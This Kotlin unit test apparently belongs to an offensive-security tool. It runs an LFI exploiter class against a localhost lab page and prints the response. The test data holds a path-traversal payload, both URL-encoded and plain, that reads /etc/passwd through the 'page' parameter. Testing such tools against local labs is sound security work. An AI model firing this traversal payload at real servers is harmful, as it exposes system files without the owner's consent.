package me.d3s34.rfi

import kotlinx.coroutines.runBlocking
import me.d3s34.lfi.LfiExploiter
import org.junit.jupiter.api.Test
import java.net.URL

internal class LfiExploiterTest {

    @Test
    fun exploit() {
        val lfiExploiter = LfiExploiter()
        val response = runBlocking {
            lfiExploiter.exploit(
                URL("http://localhost:8888/lfi.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
                "page",
                "../../../../../../../../../../../../../../../../etc/passwd",
                LfiExploiter.nixFileProof[1],
                " "
            )
        }

        println(response)
    }
}